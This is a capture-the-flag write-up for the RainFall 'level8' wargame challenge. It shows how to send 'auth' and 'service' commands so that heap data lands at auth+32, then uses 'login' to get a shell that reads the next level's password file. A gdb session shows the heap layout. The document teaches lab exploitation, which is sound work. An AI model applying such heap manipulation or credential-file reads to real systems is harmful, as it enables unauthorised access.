# Level 8

We have a big main and 2 global variables: `auth` and `service`.
The main continuously asks for input, with the valid commands being: `auth `(notice the space), `service`, `reset` and `login`.

All we need to do is run the `auth ` command once, to initialize it with an address, and then run `service` twice, so that 32 bytes after the start of auth there are nonzero bytes (from the strdup() call on line 30) and finish it off with `login`.

```shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth space
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
[redacted]
$
```

## Why it works

`fgets` reads up to 128 characters into `s`, which is only 5 bytes long. As a result it overflow into `v5` and `v6`.
Running `auth` the first time initalizes it's global variable, we now need to find a way to make sure that `auth[8] (location of auth + 8*4 bytes since auth is a pointer on int)` doesn't equal to 0.

```C
if (memcmp(s, "service", 6) == 0)
	service = (int)strdup(v6);
```
only the first 6 characters of service are checked, anything we write after will be inserted into the heap after the `auth` malloc. Eventually arriving at `auth + 32` and enabling us to pass the check.

Demonstration:
```shell
level8@RainFall:~$ gdb -q ./level8
Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
(gdb) b fgets
Breakpoint 1 at 0x8048440
(gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)

Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
auth
0x804a008, (nil)

Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
servicBBBB
0x804a008, 0x804a018

Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/10x auth
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a018:      0x0a424242      0x00000000      0x00000000      0x00020fe1
0x804a028:      0x00000000      0x00000000
(gdb) c
Continuing.
servicAAAA
0x804a008, 0x804a028
Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/c auth+32
0x804a028:      65 'A'
(gdb) c
Continuing.
login
$
```

